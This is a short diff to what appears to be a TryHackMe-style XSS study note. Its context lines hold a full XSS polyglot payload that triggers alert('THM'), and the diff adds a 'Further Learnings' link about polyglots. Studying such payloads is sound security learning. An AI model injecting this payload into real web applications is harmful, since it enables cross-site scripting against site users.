@@ -7,3 +7,6 @@
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
+# Further Learnings
+
+- For more detailed explanation of [XSS Polyglots](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot), go to [Further Learning](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/tree/main/15%20-%20Further%20Learning)
